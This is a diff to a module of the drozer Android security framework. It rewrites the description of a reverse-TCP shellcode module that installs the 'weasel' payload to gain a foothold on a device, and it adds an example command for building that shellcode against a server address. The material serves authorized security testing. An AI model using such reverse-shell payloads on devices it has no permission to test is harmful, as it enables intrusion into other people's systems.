@@ -2,11 +2,28 @@ from drozer.modules import common, Module
 
 class ARMEABI(Module, common.ShellCode):
 
-    name = "Reverse Weasel (ARMEABI)"
+    name = "weasel through a reverse TCP Shell (ARMEABI)"
     description = """
-    Shell code to deploy Weasel, using a reverse TCP Shell.
+    Run weasel through a reverse TCP Shell, to establish a foothold on the
+    device.
+    
+    This module connects to the drozer Server, and sends 0x57 (W) to request
+    weasel. The drozer Server will attempt to install weasel, and establish
+    some kind of connection back to the server.
+    
+    weasel will establish a connection back in one of a few ways:
+    
+      * a full Agent
+      * a stripped-down Agent
+      * a bind Shell  
+    
+    You can collect the shell by connecting to the server and sending 'COLLECT'
+    as the first line.
     """
-    examples = ""
+    examples = """
+    $ drozer shellcode build weasel.reverse_tcp.armeabi --server 10.0.2.2:31420
+                                                        --format U
+    """
     author = "Tyrone (@mwrlabs)"
     date = "2013-06-18"
     license = "BSD (3 clause)"
